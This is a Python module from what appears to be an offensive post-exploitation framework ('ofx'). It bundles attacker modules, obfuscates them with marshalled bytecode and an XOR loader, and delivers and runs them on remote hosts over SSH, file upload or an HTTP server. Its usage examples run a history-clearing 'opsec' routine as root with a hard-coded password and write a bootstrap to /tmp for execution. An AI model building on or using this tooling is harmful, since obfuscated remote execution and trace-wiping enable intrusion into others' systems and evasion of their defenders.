"""Bundle: collect, obfuscate, and deliver ofx.api modules to remote machines.

Typical usage::

    from ofx.api.bundle import run_remote
    from ofx.api.post.runners.ssh import PostSSH

    runner = PostSSH(host="10.0.0.5", user="root", password="s3cr3t")

    script = '''
    from ofx.api.opsec import clean_history_commands
    print(clean_history_commands())
    '''

    output = run_remote(script, runner)
    print(output)

Custom delivery adapter::

    from ofx.api.bundle import BundleAdapter, deliver_and_run, build_bundle, obfuscate_bootstrap

    class MyAdapter:
        def __init__(self, runner):
            self.runner = runner

        def deliver(self, bootstrap: str) -> str:
            # write and execute however you need
            self.runner.run(f"echo '{bootstrap}' > /tmp/t.py && python3 /tmp/t.py")

    result  = build_bundle(script)
    payload = obfuscate_bootstrap(result.bootstrap)
    output  = deliver_and_run(runner, payload, adapter=MyAdapter(runner))

Pipeline:

    script  ──► detect_ofx_imports()   (AST analysis)
            ──► collect_modules()       (gather .py files)
            ──► obfuscate_sources()     (marshal bundled sources)  [optional]
            ──► build_bundle()          (zip → base64 → bootstrap)
            ──► obfuscate_bootstrap()   (marshal → XOR → loader)  [optional]
            ──► deliver_and_run()       (UploadAdapter | HttpAdapter | custom)
"""

from __future__ import annotations

from .analyzer import KNOWN_API_MODULES, AnalysisError, BundleError, detect_ofx_imports
from .builder import BundleResult, build_bundle
from .collector import CollectionError, collect_modules
from .deliverer import (
    BundleAdapter,
    DeliveryError,
    HttpAdapter,
    InlineAdapter,
    UploadAdapter,
    deliver_and_run,
    make_adapter,
)
from .obfuscator import ObfuscationError, obfuscate_bootstrap, obfuscate_sources

__all__ = [
    # Exceptions
    "BundleError",
    "AnalysisError",
    "CollectionError",
    "ObfuscationError",
    "DeliveryError",
    # Data
    "KNOWN_API_MODULES",
    "BundleResult",
    # Adapters
    "BundleAdapter",
    "UploadAdapter",
    "HttpAdapter",
    "InlineAdapter",
    "make_adapter",
    # Pipeline steps
    "detect_ofx_imports",
    "collect_modules",
    "build_bundle",
    "obfuscate_sources",
    "obfuscate_bootstrap",
    "deliver_and_run",
    # Convenience
    "run_remote",
]


def run_remote(
    script: str,
    runner,
    *,
    extra_modules: list[str] | None = None,
    obfuscate: bool = True,
    obfuscate_sources: bool = False,
    adapter: BundleAdapter | None = None,
    method: str = "auto",
    remote_tmp: str = "/tmp/ofx_runner.py",
    python: str | None = None,
    windows: bool = False,
    http_host: str = "0.0.0.0",
    http_port: int = 8888,
    http_route: str = "/run",
    obfuscation_key: bytes | None = None,
) -> str:
    """One-shot: analyse, bundle, obfuscate, deliver, and execute *script* remotely.

    Args:
        script: Python source that may use ``ofx.api.*`` imports.
        runner: A :class:`~ofx.api.post.base.PostRunnerBase` instance, or any
            object with ``run()`` and optionally ``upload()``.
        extra_modules: Additional module names to force-include beyond what the
            AST detects.
        obfuscate: When *True* (default), compile the bootstrap to bytecode and
            XOR-encrypt it before delivery.
        obfuscate_sources: When *True*, compile every collected ``.py`` module
            file to marshalled bytecode before zipping.  The raw source of your
            tooling cannot be read from the extracted bundle.  Defaults to
            *False*.
        adapter: An explicit :class:`BundleAdapter` instance.  Overrides
            *method* and all adapter-selection parameters.
        method: Adapter selection — ``"auto"`` (default), ``"upload"``,
            ``"http"``, or ``"inline"``.  See :func:`make_adapter`.
        remote_tmp: Remote temp path (``upload`` adapter).
        python: Remote Python interpreter name.
        windows: Adjust commands for Windows targets.
        http_host: Local IP for the HTTP server (``http`` adapter).
        http_port: Local port for the HTTP server (``http`` adapter).
        http_route: URL route for the payload (``http`` adapter).
        obfuscation_key: Explicit 16-byte XOR key; randomly generated when
            *None*.

    Returns:
        stdout/stderr captured from remote execution.
    """
    result = build_bundle(script, extra_modules=extra_modules, obfuscate_sources=obfuscate_sources)
    payload = (
        obfuscate_bootstrap(result.bootstrap, key=obfuscation_key)
        if obfuscate
        else result.bootstrap
    )
    return deliver_and_run(
        runner,
        payload,
        adapter=adapter,
        method=method,
        remote_tmp=remote_tmp,
        python=python,
        windows=windows,
        http_host=http_host,
        http_port=http_port,
        http_route=http_route,
    )
